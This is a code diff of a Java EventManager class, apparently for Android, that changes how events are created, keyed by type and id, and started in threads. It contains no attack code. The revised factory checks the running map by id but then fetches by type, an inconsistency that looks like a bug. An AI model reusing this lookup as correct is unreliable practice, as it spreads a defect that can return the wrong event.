@@ -53,14 +53,14 @@ public class EventManager extends Manager {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	private EventBase factory(final int key) {
+	private EventBase factory(final int type, final int id) {
 		EventBase e = null;
 
-		if (running.containsKey(key) == true) {
-			return (EventBase) running.get(key);
+		if (running.containsKey(id) == true) {
+			return (EventBase) running.get(type);
 		}
 
-		switch (key) {
+		switch (type) {
 		case EventConf.EVENT_TIMER:
 			Log.d("QZ", TAG + " Info: " + "");
 			e = new TimerEvent();
@@ -116,12 +116,12 @@ public class EventManager extends Manager {
 			break;
 
 		default:
-			Log.d("QZ", TAG + " Error: " + "Unknown: " + key);
+			Log.d("QZ", TAG + " Error: " + "Unknown: " + type);
 			break;
 		}
 
 		if (e != null) {
-			running.put(key, e);
+			running.put(id, e);
 		}
 
 		return e;
@@ -151,11 +151,15 @@ public class EventManager extends Manager {
 
 		while (it.hasNext()) {
 			final Map.Entry<Integer, EventConf> pairs = it.next();
-			final int key = pairs.getValue().getType();
-			final EventBase e = factory(key);
+			
+			final EventConf conf = pairs.getValue();
+			final int type = conf.getType();
+			Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping");
+			
+			final EventBase e = factory(type, conf.getId());
 
 			if (e != null) {
-				e.parse(pairs.getValue());
+				e.parse(conf);
 				
 				if (e.getStatus() != EventConf.EVENT_RUNNING) {
 					final Thread t = new Thread(e);
@@ -163,6 +167,7 @@ public class EventManager extends Manager {
 						t.setName(e.getClass().getSimpleName());
 					}
 					t.start();
+					Log.d("QZ", TAG + " (startAll): " + e);
 					threads.put(e, t);
 				} else {
 					Log.d("QZ", TAG + " Warn: event already running");
